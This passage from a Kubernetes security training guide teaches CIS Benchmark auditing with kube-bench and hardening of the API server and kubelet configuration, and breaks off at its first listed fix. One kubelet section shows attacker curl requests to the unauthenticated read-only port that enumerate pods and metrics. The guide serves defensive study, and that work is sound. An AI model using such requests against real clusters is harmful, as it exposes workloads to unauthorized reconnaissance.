Chapter 4: CIS Benchmarks & kube-bench — Measuring Your Security Baseline

Before you can harden a Kubernetes cluster, you must measure it. You cannot fix what you cannot see. The CIS Kubernetes Benchmark is the industry-standard checklist — over 200 security configuration tests covering every component: the API server, etcd, kubelet, controller manager, scheduler, and worker nodes. The tool that automates these checks is kube-bench. This chapter teaches you to run kube-bench, interpret every FAIL and WARN result, and apply the exact fix — editing the right configuration file, adding the right flag, and verifying the fix. Every CKS hardening task traces back to a CIS check.

🟢 Beginner ⏱️ ~2 hours 🔧 Hands-On 📏 CIS Standards

🎯 What You'll Learn

  • ✅ Understand what CIS Benchmarks are and why they are the foundation of K8s security auditing
  • ✅ Install and run kube-bench against control plane and worker nodes
  • ✅ Interpret PASS/FAIL/WARN output and map each result to the configuration file you must edit
  • ✅ Fix the most common API server CIS failures by editing /etc/kubernetes/manifests/kube-apiserver.yaml
  • ✅ Harden the kubelet by editing /var/lib/kubelet/config.yaml — disable anonymous auth, enable webhook authorization
  • ✅ Apply the top 5 highest-impact CIS fixes to the anihpj cluster and verify each with a kube-bench re-run
🎓 CKS Relevance
Cluster Setup 15% Cluster Hardening 15%
🧠 The kube-bench → Fix Pattern

The CKS exam follows this exact pattern for hardening tasks: you are given a cluster with security misconfigurations. The exam terminal has kube-bench pre-installed. Your workflow is always: (1) Run kube-bench, (2) Read the FAIL output, (3) Find the remediation advice in the kube-bench output, (4) Edit the correct configuration file, (5) Verify by re-running kube-bench. Memorize this cycle. Every hardening task on the exam is some variation of it.

4.1 What Are CIS Benchmarks?

The Center for Internet Security (CIS) is a non-profit organization that publishes security configuration guidelines — called CIS Benchmarks — for operating systems, cloud providers, and software platforms. The CIS Kubernetes Benchmark is a document containing over 200 specific, testable security configuration checks for every component in a Kubernetes cluster.

📖 What Makes a CIS Check "Testable"?

Every CIS check is written as a binary assertion: it either passes or it fails. There are no subjective "best practices" in the CIS Benchmark — only verifiable configuration states. For example: "Ensure that the --anonymous-auth argument is set to false" (Check 1.2.1). kube-bench reads the actual API server configuration and answers PASS or FAIL. This binary nature is why kube-bench can automate the entire benchmark — and why the CKS exam relies so heavily on it.

CIS Benchmark Check Areas — What Gets Audited

The 5 major categories of CIS Kubernetes Benchmark checks
  ┌────────────────────────────────────────────────────────────┐
  │  CIS KUBERNETES BENCHMARK — 5 CHECK AREAS                 │
  │                                                            │
  │  1. CONTROL PLANE COMPONENTS                               │
  │     → kube-apiserver flags (auth, admission, TLS, audit)  │
  │     → kube-controller-manager flags                        │
  │     → kube-scheduler flags                                 │
  │     Covers: 50+ checks on API server alone                 │
  │                                                            │
  │  2. etcd                                                   │
  │     → TLS configuration (peer and client certs)            │
  │     → File permissions on certs and data directory         │
  │     → Client certificate authentication enabled            │
  │     Covers: 10+ checks                                     │
  │                                                            │
  │  3. CONTROL PLANE CONFIGURATION                            │
  │     → Audit logging enabled and configured                 │
  │     → Encryption at rest for Secrets                       │
  │     → Admission plugins enabled (NodeRestriction, etc.)    │
  │     → RBAC enabled, ABAC disabled                          │
  │     Covers: 30+ checks                                     │
  │                                                            │
  │  4. WORKER NODES                                           │
  │     → kubelet configuration (auth, read-only port)         │
  │     → Node OS hardening (kernel params, packages)          │
  │     → kube-proxy configuration                             │
  │     Covers: 40+ checks                                     │
  │                                                            │
  │  5. KUBERNETES POLICIES                                    │
  │     → NetworkPolicy enforcement                            │
  │     → RBAC minimal permissions                             │
  │     → Secrets management                                   │
  │     → Pod Security Standards                               │
  │     Covers: 30+ checks                                     │
  └────────────────────────────────────────────────────────────┘

Why CIS Benchmarks Matter for the CKS Exam

📏
Industry Standard

CIS Benchmarks are used by auditors, compliance officers, and security teams worldwide. PCI-DSS, HIPAA, and SOC 2 audits often reference CIS checks. Passing them is not optional for regulated industries.

🎯
Exam Blueprint

The CKS exam's "Cluster Setup" and "Cluster Hardening" domains are essentially a practical test of your ability to pass CIS checks. If you can run kube-bench and fix every FAIL, you can pass those exam sections.

🔄
Continuous Compliance

In production, kube-bench runs as a CronJob or is integrated into CI/CD. Every configuration change is checked against CIS. Drift is detected immediately — not during the next annual audit.

How CIS Benchmarks Are Created — And Why They Are Trusted

CIS Benchmarks are not written by a single company or vendor. They are developed through a consensus-based process involving hundreds of security professionals from different organizations — cloud providers, security vendors, government agencies, and independent researchers. The Kubernetes Benchmark is maintained by the CIS Kubernetes Community, which includes engineers from Google, Red Hat, VMware, and Aqua Security (the creators of kube-bench). This multi-stakeholder approach means the benchmark is vendor-neutral — it does not favor any specific tool or platform. Every check in the benchmark must survive peer review and demonstrate a clear security benefit before being included.

CIS Benchmarks and Regulatory Compliance

Passing CIS checks is not just about security — it is increasingly about legal and contractual obligation. Many regulatory frameworks and industry standards explicitly reference or align with CIS Benchmarks. Understanding these connections helps you justify the hardening work to management and auditors:

FrameworkHow CIS Maps to ItExample
PCI-DSS (Payment Card Industry)Requires secure system configurations. CIS checks satisfy Requirement 2 (secure configurations) and Requirement 7 (access control).If anihpj processes payments, CIS 1.2.1 (anonymous-auth=false) satisfies PCI-DSS Req 7.2.
SOC 2 (Service Organization Control)Requires documented security controls and evidence of their effectiveness. kube-bench reports serve as audit evidence.A kube-bench JSON report showing 95% PASS rate is auditable evidence for SOC 2 control testing.
HIPAA (Healthcare)Requires access controls and audit trails. CIS checks for RBAC (1.2.6) and audit logging (1.2.14) directly satisfy these.If anihpj stores health-related job data, CIS 1.2.22 (audit policy) is a HIPAA requirement.
ISO 27001Requires a formal Information Security Management System. CIS benchmarks provide the technical controls annex.A.9.2.1 (access control) → CIS 1.2.6 (RBAC). A.12.4.1 (event logging) → CIS 1.2.14 (audit logs).

CIS Benchmark Versions — Which One Should You Use?

The CIS Kubernetes Benchmark is versioned alongside Kubernetes itself. Always use the benchmark version that matches your cluster's Kubernetes version. Running kube-bench against the wrong benchmark version produces false positives (checks for features that don't exist in your version) and false negatives (missing checks for new security features). kube-bench auto-detects your K8s version and selects the appropriate benchmark, but on the exam, be aware that the exam environment will have the correct version pre-configured.

CIS Benchmark Version → Kubernetes Version Mapping
  KUBERNETES VERSION        CIS BENCHMARK VERSION
  ─────────────────         ─────────────────────
  v1.30                     1.8.0 (latest)
  v1.29                     1.7.1
  v1.28                     1.7.0
  v1.27                     1.7.0
  v1.26                     1.6.0

  Key changes between versions:
  • 1.6.0 → 1.7.0: Removed PodSecurityPolicy checks (PSP deprecated in 1.25)
  • 1.7.0 → 1.7.1: Added checks for Pod Security Standards (PSS)
  • 1.7.1 → 1.8.0: Added checks for Structured Authentication Config, new audit rules

  ⚠️  NEVER run a benchmark written for v1.30 against a v1.24 cluster.
      It will check for features that do not exist — guaranteed false positives.
💡 The CIS Benchmark Is Free

Download it at cisecurity.org/benchmark/kubernetes. The PDF includes every check with rationale, audit steps, and remediation. The CKS exam aligns closely with the CIS Benchmark — studying it is studying for the exam.

4.2 Running kube-bench — Your Security Audit Tool

kube-bench is an open-source Go application from Aqua Security that automates the CIS Kubernetes Benchmark. It connects to your cluster, inspects the configuration of every component, and produces a report showing exactly which checks passed and which failed — with specific remediation steps for every failure.

📖 kube-bench at a Glance

Repository: github.com/aquasecurity/kube-bench · Language: Go · License: Apache 2.0 · CKS Exam: ✅ MUST KNOW — pre-installed in exam environment. How it works: kube-bench reads component configuration files directly from the node filesystem. It does not use the Kubernetes API — it reads /etc/kubernetes/manifests/kube-apiserver.yaml, /var/lib/kubelet/config.yaml, and systemd service files directly.

Installing and Running kube-bench

Installation and basic usage — the commands you need on the CKS exam
  # Install kube-bench (one-liner for the exam)
  $ curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/\
    kube-bench_linux_amd64.tar.gz | tar xz
  $ sudo mv kube-bench /usr/local/bin/

  # Run ALL checks on the control plane (master node)
  $ kube-bench run --targets=master

  # Run ALL checks on worker nodes
  $ kube-bench run --targets=node

  # Run a SPECIFIC check (useful for verifying fixes)
  $ kube-bench run --check=1.2.1   # Only check API server anonymous auth

  # Run checks with JSON output (for automated processing)
  $ kube-bench run --json --targets=master > cis-report.json

Reading kube-bench Output — How to Interpret Results

kube-bench output has three result types. Understanding each is essential because the exam expects you to know which ones demand action and which can be ignored:

ResultMeaningAction Required?Example
[PASS]The configuration matches the CIS recommendation exactly. No action needed.❌ No[PASS] 1.2.1 Ensure --anonymous-auth=false — your API server is correctly configured.
[FAIL]The configuration does NOT meet the CIS recommendation. This is a security vulnerability that must be fixed.✅ YES — fix immediately[FAIL] 1.2.6 Ensure --authorization-mode=RBAC — your authorization mode is set to AlwaysAllow. Fix it.
[WARN]kube-bench cannot automatically determine if this applies to your environment. Manual review needed.⚠️ Review — may apply[WARN] 1.2.14 Ensure --audit-log-path is set — kube-bench detected the flag but wasn't sure about the path value. Manually verify.

Real kube-bench Output — Annotated Example

Actual kube-bench run on a default cluster — what you will see on exam day
  $ kube-bench run --check 1.2

  [INFO] 1 Master Node Security Configuration
  [INFO] 1.2 API Server
  ────────────────────────────────────────────────
  [PASS] 1.2.1  Ensure --anonymous-auth=false
         ✅ Good. No one can access the API without credentials.

  [FAIL] 1.2.2  Ensure --token-auth-file is not set
         ❌ Static token file is configured. This is a legacy auth method.
         Remediation: Edit /etc/kubernetes/manifests/kube-apiserver.yaml
         and remove the --token-auth-file parameter.

  [WARN] 1.2.6  Ensure --authorization-mode includes RBAC
         ⚠️  kube-bench detected --authorization-mode=Node,RBAC,AlwaysAllow
         "AlwaysAllow" should NOT be present. It grants all requests.
         Remediation: Change to --authorization-mode=Node,RBAC

  [FAIL] 1.2.9  Ensure --enable-admission-plugins includes NodeRestriction
         ❌ The NodeRestriction plugin is not in the admission plugin list.
         A compromised kubelet could modify resources belonging to other nodes.
         Remediation: Add NodeRestriction to --enable-admission-plugins

  [PASS] 1.2.14 Ensure --audit-log-path is set
         ✅ Audit logging is configured and writing to /var/log/kubernetes/audit.log

  == Remediations master ==
  1.2.2 Edit /etc/kubernetes/manifests/kube-apiserver.yaml
        Remove the --token-auth-file parameter
  1.2.6 Edit /etc/kubernetes/manifests/kube-apiserver.yaml
        Set --authorization-mode=Node,RBAC
  1.2.9 Edit /etc/kubernetes/manifests/kube-apiserver.yaml
        Add NodeRestriction to --enable-admission-plugins

  ────────────────────────────────────────────────
  SUMMARY: 2 PASS, 2 FAIL, 1 WARN — 2 fixes needed
⚠️ CKS Exam Reality: kube-bench Is Your Answer Key

On the exam, a hardening task will typically say: "The cluster has misconfigurations. Harden it." The first thing you do is run kube-bench. The FAIL items in its output tell you exactly which flags to add or remove, and the remediation section tells you exactly which file to edit. Do not guess — let kube-bench guide you. The exam does not expect you to have memorized all 200+ CIS checks. It expects you to know how to use kube-bench to find and fix them.

How kube-bench Works Under the Hood

Understanding kube-bench's internal architecture helps you troubleshoot when it behaves unexpectedly. kube-bench does not use the Kubernetes API at all — it reads configuration files directly from the node's filesystem and runs shell commands to inspect running processes. This is intentional: if the API server is misconfigured or down, kube-bench can still audit it because it reads the static pod manifest directly. Here is what kube-bench actually does for each check:

kube-bench Internal Architecture — How Each Check Is Performed
  For API SERVER checks (CIS 1.2.x):
  ─────────────────────────────────────
    1. Reads /etc/kubernetes/manifests/kube-apiserver.yaml
    2. Parses the 'command' array for flags
    3. Checks: Is --anonymous-auth present? Is its value 'false'?
    4. If yes → [PASS]. If no → [FAIL]. If ambiguous → [WARN].

  For etcd checks (CIS 2.x):
  ───────────────────────────────────
    1. Reads /etc/kubernetes/manifests/etcd.yaml
    2. Checks TLS flags, data directory permissions, cert file ownership
    3. Runs stat on cert files to verify 600 permissions

  For kubelet checks (CIS 4.2.x):
  ────────────────────────────────────
    1. Reads /var/lib/kubelet/config.yaml
    2. Runs ps aux | grep kubelet to check command-line flags
    3. Merges config file + CLI flags (CLI flags override config file)

  For OS-level checks (CIS 4.1.x):
  ──────────────────────────────────
    1. Runs shell commands: sysctl, iptables, systemctl
    2. Checks kernel parameters (net.ipv4.ip_forward, etc.)
    3. Verifies package versions for known-vulnerable software

kube-bench Run Targets — When to Use Each

kube-bench has multiple run targets that determine which set of checks is executed. Using the wrong target wastes time and produces irrelevant output. On the CKS exam, the task description tells you which component to harden — that determines the target:

TargetChecks RunWhen to UseExam Context
--targets=masterAPI server, etcd, controller-manager, scheduler, control plane configOn control plane nodes only"Harden the control plane" → use master
--targets=nodekubelet, kube-proxy, container runtime, OS hardeningOn worker nodes (and control plane nodes too — they also run kubelet)"Harden the kubelet" → use node
--targets=master,nodeAll checks (both sets)Full cluster audit on a control plane node"Audit and harden the cluster" → use both
--targets=etcdetcd-specific checks onlyOn etcd nodes (if etcd runs on separate nodes)"Secure etcd" → use etcd
--targets=policiesRBAC, NetworkPolicy, PSP/PSS, SecretsAny node with kubectl access to the cluster"Check RBAC configuration" → use policies

Common kube-bench Pitfalls — What Can Go Wrong

😰 Pitfall 1: Running kube-bench from the Wrong Node

kube-bench reads local files. If you run --targets=master on a worker node, it cannot find /etc/kubernetes/manifests/kube-apiserver.yaml and reports everything as [FAIL] or [WARN]. Always run master-targeted checks on a control plane node. Use kubectl get nodes -o wide to identify which nodes have the control-plane role.

✅ Pitfall 2: Ignoring [WARN] Results

A [WARN] means kube-bench could not automatically determine the check result. It does NOT mean the check passed. Always manually investigate [WARN] items — they may be hiding real vulnerabilities. On the exam, if a check returns [WARN], run kube-bench run --check=<number> -v (verbose mode) to see exactly why it could not determine the result, then manually verify by inspecting the configuration file yourself.

😰 Pitfall 3: Fixing a Check But kube-bench Still Shows [FAIL]

This happens when you edit the wrong file or have a typo in the flag name. For API server checks, always verify your edit: grep anonymous-auth /etc/kubernetes/manifests/kube-apiserver.yaml. Wait 30 seconds for the kubelet to restart the static pod, then re-run kube-bench. For kubelet checks, remember that CLI flags in the systemd service file OVERRIDE settings in /var/lib/kubelet/config.yaml. Check both locations: ps aux | grep kubelet | grep anonymous-auth and grep anonymous /var/lib/kubelet/config.yaml.

4.3 Fixing Common CIS Failures — The API Server Manifest

The Kubernetes API server is configured through a static pod manifest located at /etc/kubernetes/manifests/kube-apiserver.yaml. Unlike regular pods, static pods are managed directly by the kubelet — not by the API server or a Deployment controller. This means that editing the YAML file and saving it causes the kubelet to automatically restart the API server with the new configuration. There is no kubectl apply — there is no API server running yet to process it. You edit the file directly on the control plane node using vi or nano.

🔴 Critical: Editing Static Pod Manifests

When you edit /etc/kubernetes/manifests/kube-apiserver.yaml, the kubelet detects the change within seconds and restarts the API server pod. During this restart (typically 10-30 seconds), kubectl commands will fail because the API is temporarily unavailable. Always make multiple flag changes in a SINGLE edit — do not edit, save, wait, edit, save, wait. Batch your changes. Also, make a backup before editing: cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.backup.

Critical API Server Flags — CIS Must-Pass Checks

CIS CheckFlagSecure ValueWhat It Prevents
1.2.1--anonymous-authfalseUnauthenticated access. Without this, anyone on the network can query your API. Tesla breach enabler.
1.2.2--token-auth-fileREMOVE entirelyStatic token auth (legacy). Tokens in a file are never rotated and are trivial to steal.
1.2.6--authorization-modeNode,RBACAlwaysAllow mode. Only Node and RBAC should be present. AlwaysAllow grants every request.
1.2.9--enable-admission-pluginsInclude NodeRestrictionCompromised kubelet modifying other nodes' resources. NodeRestriction limits kubelets to their own node.
1.2.14--audit-log-path/var/log/kubernetes/audit.logNo forensic record of API activity. Without audit logs, you cannot investigate breaches.
1.2.20--tls-cert-file + --tls-private-key-fileValid paths to cert+keyUnencrypted API traffic. TLS is the most fundamental security control — mandatory.
1.2.22--audit-policy-filePath to audit policy YAMLAudit logging without a policy logs nothing useful. The policy defines WHAT to log.

Anatomy of a Secure kube-apiserver.yaml

Key sections of the API server static pod manifest — annotated with CIS checks
  apiVersion: v1
  kind: Pod
  metadata:
    name: kube-apiserver
    namespace: kube-system
    labels:
      component: kube-apiserver
  spec:
    containers:
    - name: kube-apiserver
      image: registry.k8s.io/kube-apiserver:v1.30.0
      command:
      - kube-apiserver
      # ═══════════════════════════════════════════════════
      # AUTHENTICATION FLAGS
      # ═══════════════════════════════════════════════════
      - --anonymous-auth=false                    # CIS 1.2.1 ✅
      # REMOVED: --token-auth-file                # CIS 1.2.2 ✅
      - --client-ca-file=/etc/kubernetes/pki/ca.crt   # CIS 1.2.20 ✅

      # ═══════════════════════════════════════════════════
      # AUTHORIZATION FLAGS
      # ═══════════════════════════════════════════════════
      - --authorization-mode=Node,RBAC            # CIS 1.2.6 ✅

      # ═══════════════════════════════════════════════════
      # ADMISSION CONTROL FLAGS
      # ═══════════════════════════════════════════════════
      - --enable-admission-plugins=NodeRestriction,PodSecurity,AlwaysPullImages
                                                   # CIS 1.2.9 ✅

      # ═══════════════════════════════════════════════════
      # AUDIT LOGGING FLAGS
      # ═══════════════════════════════════════════════════
      - --audit-policy-file=/etc/kubernetes/audit-policy.yaml  # CIS 1.2.22 ✅
      - --audit-log-path=/var/log/kubernetes/audit.log          # CIS 1.2.14 ✅
      - --audit-log-maxage=30                                    # Keep 30 days
      - --audit-log-maxbackup=10                                 # Keep 10 backups
      - --audit-log-maxsize=100                                  # Max 100MB each

      # ═══════════════════════════════════════════════════
      # TLS FLAGS
      # ═══════════════════════════════════════════════════
      - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt    # CIS 1.2.20 ✅
      - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key

      # ═══════════════════════════════════════════════════
      # etcd TLS FLAGS
      # ═══════════════════════════════════════════════════
      - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
      - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
      - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
💡 After Editing: Watch the Pod Restart

After saving kube-apiserver.yaml, wait a few seconds then verify the new pod is running: kubectl get pods -n kube-system | grep apiserver. The RESTARTS column should show a new restart count. Then immediately run kube-bench to verify your fix: kube-bench run --check 1.2.1 should now show [PASS]. If it still shows [FAIL], you edited the wrong flag or there is a typo — re-check the manifest.

What Actually Happens When You Edit a Static Pod Manifest

The kubelet on every control plane node runs a file watcher on /etc/kubernetes/manifests/. This is not a Kubernetes controller — it is a kubelet-internal goroutine that polls the directory every few seconds. Understanding the exact sequence helps you diagnose problems when the API server does not come back:

Static Pod Lifecycle — The Exact Sequence After Saving kube-apiserver.yaml
  T+0s:   You save kube-apiserver.yaml with new flags (:wq)
  T+2s:   kubelet's file watcher detects the modified inode
  T+3s:   kubelet compares the manifest hash with its cached hash
          → Hash differs → triggers a static pod update
  T+4s:   kubelet sends SIGTERM to the old API server container
  T+5s:   Old container stops (graceful period). Port 6443 goes dark.
  T+6s:   kubelet creates a NEW container with the updated command flags
  T+8s:   New API server container starts. Port 6443 begins listening.
  T+10s:  API server loads etcd data, initializes RBAC caches
  T+15s:  API server marks itself ready. kubectl commands work again.
  T+30s:  kube-bench re-run now reflects the new configuration.

  ⚠️  During T+5s to T+10s: ALL kubectl commands fail with
      "The connection to the server was refused". This is NORMAL.

  🔴 RECOVERY: If the API server does NOT come back after 60 seconds:
     1. Check the kubelet knows about the manifest:
        $ ls -la /etc/kubernetes/manifests/kube-apiserver.yaml
     2. Check the kubelet logs for errors:
        $ journalctl -u kubelet -f | grep apiserver
     3. Check the new container's logs:
        $ crictl ps -a | grep apiserver
        $ crictl logs 
     4. Most common cause: TYPO in a flag name. kube-apiserver refuses
        to start with an unrecognized flag. Check your YAML carefully.
     5. If all else fails: RESTORE FROM BACKUP.
        $ cp /root/kube-apiserver.yaml.backup /etc/kubernetes/manifests/
        → kubelet detects the change → restarts with known-good config

Recovering from a Bad Manifest Edit — The Emergency Rollback

This is a scenario you MUST be prepared for on the CKS exam. You edit the API server manifest, save it, and suddenly kubectl stops working. The API server will not start because of an invalid flag. You cannot use kubectl to fix it because kubectl requires the API server. Here is the recovery procedure — memorize it:

🔴 EMERGENCY: API Server Not Starting — Recovery Steps
  • Step 1: Do NOT panic. Your cluster state (pods, deployments, PVs) is in etcd, not in the API server. etcd is still running. Your data is safe.
  • Step 2: SSH to the control plane node directly. You cannot use kubectl. Use SSH or the cloud console.
  • Step 3: Restore the backup. cp /root/kube-apiserver.yaml.backup /etc/kubernetes/manifests/kube-apiserver.yaml. This was created before your edit — right? (Always make a backup!)
  • Step 4: Wait 30 seconds. kubelet detects the restored manifest and starts the API server with the known-good configuration.
  • Step 5: Verify. kubectl get nodes should work again.
  • Step 6: Debug what went wrong. crictl logs <old-container-id> to see the error message from the failed attempt. Fix the typo in your YAML, make a new backup, and try again.

⚠️ CKS EXAM: Always make a backup before editing ANY manifest file. The exam scores you on whether the cluster works at the end, not just on whether you added the right flags. A cluster with a dead API server = FAIL.

4.4 kubelet Hardening — CIS Node Checks

The kubelet runs on every node in the cluster. It is the agent responsible for starting and stopping pods, reporting node status, and managing container lifecycles. A compromised kubelet gives an attacker control over every pod on that node — including the ability to exec into containers, read pod logs, and access mounted Secrets. The kubelet is configured through /var/lib/kubelet/config.yaml (and sometimes through command-line flags in the systemd service file at /etc/systemd/system/kubelet.service.d/10-kubeadm.conf).

kubelet Hardening — Before vs After

❌ Insecure kubelet (Default)
  • authentication.anonymous.enabled: true — Anyone can query the kubelet API without credentials
  • authentication.webhook.enabled: false — No API server validation of kubelet requests
  • authorization.mode: AlwaysAllow — Every authenticated request is permitted with no RBAC check
  • readOnlyPort: 10255 — Unauthenticated read-only port exposes pod list, container logs, and metrics to anyone

ATTACKER: curl http://node:10255/pods → Lists all pods. curl http://node:10255/stats/summary → All metrics. No credentials needed.

✅ Hardened kubelet (CKS)
  • authentication.anonymous.enabled: false — All requests must be authenticated
  • authentication.webhook.enabled: true — Every request is validated by the API server
  • authorization.mode: Webhook — SubjectAccessReview checks every request against RBAC
  • readOnlyPort: 0 — Unauthenticated port is completely disabled

ATTACKER: curl http://node:10255/pods → Connection REFUSED. Anonymous access → 401 Unauthorized.

The kubelet Configuration File — Annotated

/var/lib/kubelet/config.yaml — the key hardening fields
  apiVersion: kubelet.config.k8s.io/v1beta1
  kind: KubeletConfiguration

  # ═══════════════════════════════════════════════════
  # AUTHENTICATION (CIS 4.2.1, 4.2.2)
  # ═══════════════════════════════════════════════════
  authentication:
    anonymous:
      enabled: false              # CIS 4.2.1 ✅ Block unauthenticated requests
    webhook:
      enabled: true               # CIS 4.2.2 ✅ API server validates all requests
      cacheTTL: 2m0s

  # ═══════════════════════════════════════════════════
  # AUTHORIZATION (CIS 4.2.3)
  # ═══════════════════════════════════════════════════
  authorization:
    mode: Webhook                  # CIS 4.2.3 ✅ Every request → SubjectAccessReview

  # ═══════════════════════════════════════════════════
  # PORTS (CIS 4.2.4, 4.2.5)
  # ═══════════════════════════════════════════════════
  readOnlyPort: 0                 # CIS 4.2.5 ✅ Disable insecure port entirely
  healthzPort: 10248              # Keep health check port (internal only)
  healthzBindAddress: 127.0.0.1   # Bind health check to localhost only

  # ═══════════════════════════════════════════════════
  # TLS (CIS 4.2.10)
  # ═══════════════════════════════════════════════════
  tlsCertFile: /var/lib/kubelet/pki/kubelet.crt
  tlsPrivateKeyFile: /var/lib/kubelet/pki/kubelet.key
  rotateCertificates: true        # Auto-rotate certs before expiry

  # ═══════════════════════════════════════════════════
  # PROTECT KERNEL DEFAULTS (CIS 4.2.6)
  # ═══════════════════════════════════════════════════
  protectKernelDefaults: true     # CIS 4.2.6 ✅ Kernel params cannot be overridden

Applying kubelet Changes

Unlike the API server (which auto-restarts via kubelet watching the manifest), the kubelet itself requires a manual restart after configuration changes. The kubelet is managed by systemd, not by a static pod manifest:

The kubelet restart procedure
  # Step 1: Edit the kubelet configuration
  $ vi /var/lib/kubelet/config.yaml

  # Step 2: Restart kubelet (systemd-managed)
  $ systemctl daemon-reload
  $ systemctl restart kubelet

  # Step 3: Verify kubelet is running
  $ systemctl status kubelet
  ● kubelet.service - kubelet: The Kubernetes Node Agent
     Active: active (running)

  # Step 4: Verify the node is Ready
  $ kubectl get nodes
  NAME      STATUS   ROLES           AGE   VERSION
  node-1    Ready    control-plane   30d   v1.30.0

  # Step 5: Re-run kube-bench to verify the fix
  $ kube-bench run --targets=node --check=4.2.1
  [PASS] 4.2.1 Ensure --anonymous-auth=false ✅
⚠️ Restart Carefully — Node Goes NotReady Briefly

When you restart the kubelet, the node briefly goes to NotReady status (typically 5-15 seconds). Pods on the node continue running during this period — the kubelet restart does not kill running containers. However, the scheduler will not place new pods on the node until it returns to Ready. On the CKS exam, always drain the node first if the question asks you to (kubectl drain node-1 --ignore-daemonsets), then restart kubelet, then uncordon (kubectl uncordon node-1). If the exam does not specify draining, a simple restart is fine.

How kubelet Webhook Authentication Actually Works

When you set authentication.webhook.enabled: true and authorization.mode: Webhook, every request to the kubelet API (on port 10250) is validated by the API server — not by the kubelet itself. This is the most important security architecture detail for the CKS exam. Here is the exact flow:

kubelet Webhook Auth Flow — Step by Step
  STEP 1: A request arrives at kubelet port 10250
  ─────────────────────────────────────────────────
  Example: kubectl logs anihpj-pod → API server → kubelet:10250/logs

  STEP 2: kubelet checks: is the request authenticated?
  ────────────────────────────────────────────────────────
  With webhook enabled, kubelet does NOT trust its own certs.
  It extracts the bearer token from the request and sends it
  to the API server for validation:

  POST https://kube-apiserver:6443/apis/authentication.k8s.io/v1/tokenreview
  {
    "apiVersion": "authentication.k8s.io/v1",
    "kind": "TokenReview",
    "spec": {
      "token": ""
    }
  }

  STEP 3: API server responds with the authenticated identity
  ─────────────────────────────────────────────────────────────
  {
    "status": {
      "authenticated": true,
      "user": {
        "username": "system:serviceaccount:kube-system:kubelet-api",
        "groups": ["system:serviceaccounts", "system:authenticated"]
      }
    }
  }

  STEP 4: kubelet checks authorization (with authorization.mode: Webhook)
  ────────────────────────────────────────────────────────────────────────
  POST https://kube-apiserver:6443/apis/authorization.k8s.io/v1/subjectaccessreview
  {
    "spec": {
      "user": "system:serviceaccount:kube-system:kubelet-api",
      "resourceAttributes": {
        "verb": "get",
        "resource": "pods",
        "subresource": "log",
        "name": "anihpj-pod",
        "namespace": "anihpj"
      }
    }
  }

  STEP 5: API server checks RBAC
  ──────────────────────────────
  Does SA "kube-system:kubelet-api" have a RoleBinding that allows
  "get" on "pods/log" in namespace "anihpj"?

  If YES → HTTP 200. kubelet returns the logs.
  If NO  → HTTP 403. kubelet rejects the request.

  🔑 KEY INSIGHT: With webhook mode, the kubelet has ZERO authority
     to decide who can access its API. Every decision is made by the
     API server via RBAC. This means a compromised kubelet cannot
     grant access to unauthorized users — it MUST ask the API server.

kubelet Certificate Rotation — Automated PKI Management

kubelet certificates expire after 1 year by default. Without rotation, your nodes eventually lose the ability to communicate with the API server — and your cluster breaks silently. The CKS exam expects you to know how to enable automatic certificate rotation so this never happens:

kubelet Certificate Rotation Flow
  CONFIGURATION (in /var/lib/kubelet/config.yaml):
  ─────────────────────────────────────────────────
  rotateCertificates: true          # kubelet requests new certs
  serverTLSBootstrap: true          # kubelet uses CSR API for server cert

  THE AUTOMATIC ROTATION FLOW:
  ────────────────────────────
  1. kubelet monitors its certificate expiry date
  2. At 80% of cert lifetime (approx. 9.6 months), kubelet generates
     a new key pair and creates a CertificateSigningRequest (CSR)
  3. A controller (kube-controller-manager with
     --cluster-signing-cert-file and --cluster-signing-key-file)
     automatically approves the CSR and signs the new certificate
  4. kubelet picks up the new cert and replaces the old one
  5. The node continues operating with NO interruption

  VERIFYING ROTATION:
  ───────────────────
  # Check if rotation is enabled
  $ grep rotateCertificates /var/lib/kubelet/config.yaml

  # Check current cert expiry
  $ openssl x509 -in /var/lib/kubelet/pki/kubelet-client-current.pem \
      -noout -dates
  notBefore=Jan  1 00:00:00 2024 GMT
  notAfter=Dec 31 23:59:59 2024 GMT

  # List CSRs (pending rotation requests)
  $ kubectl get csr
  NAME        AGE   SIGNERNAME                     REQUESTOR          CONDITION
  csr-abc123  5m    kubernetes.io/kube-apiserver-* system:node:node-1 Approved

  ⚠️  WITHOUT rotation: On day 366, the kubelet cert expires.
      kubelet disconnects from API server. Node becomes NotReady.
      Pods keep running but cannot be managed. Emergency cert renewal
      required — manually. Avoid this by enabling rotation NOW.

4.5 Applying CIS Benchmark Fixes — Hands-On with anihpj

Let's go through a realistic scenario: your anihpj production cluster has just been audited and kube-bench reports 12 FAIL results. You don't have time to fix all 12 before the security review deadline — you need to prioritize. Here are the top 5 highest-impact fixes, the exact commands, and the kube-bench verification for each:

The CIS Fix Workflow — Your Repeatable Cycle

The 5-step cycle for every CIS failure — memorize this
  ┌──────────────────────────────────────────────────────────────┐
  │  THE kube-bench → FIX → VERIFY CYCLE                         │
  │                                                              │
  │  1. RUN:    kube-bench run --targets=master,node             │
  │     → Note all [FAIL] items                                  │
  │                         │                                    │
  │                         ▼                                    │
  │  2. READ:   The remediation section tells you:               │
  │     • Which file to edit                                     │
  │     • Which flag to add/remove/change                        │
  │                         │                                    │
  │                         ▼                                    │
  │  3. EDIT:   vi /etc/kubernetes/manifests/kube-apiserver.yaml │
  │     (or /var/lib/kubelet/config.yaml for kubelet)           │
  │     Batch ALL flag changes into ONE edit                     │
  │                         │                                    │
  │                         ▼                                    │
  │  4. WAIT:   API server: kubelet auto-restarts (10-30s)      │
  │     kubelet: systemctl restart kubelet                       │
  │                         │                                    │
  │                         ▼                                    │
  │  5. VERIFY: kube-bench run --check=           │
  │     → [PASS] ✅ — confirmed. Next FAIL.                      │
  │     → [FAIL] ❌ — typo? wrong file? Re-check.                │
  └──────────────────────────────────────────────────────────────┘

Top 5 Highest-Impact CIS Fixes for the anihpj Cluster

1️⃣
--anonymous-auth=false on API Server (CIS 1.2.1)

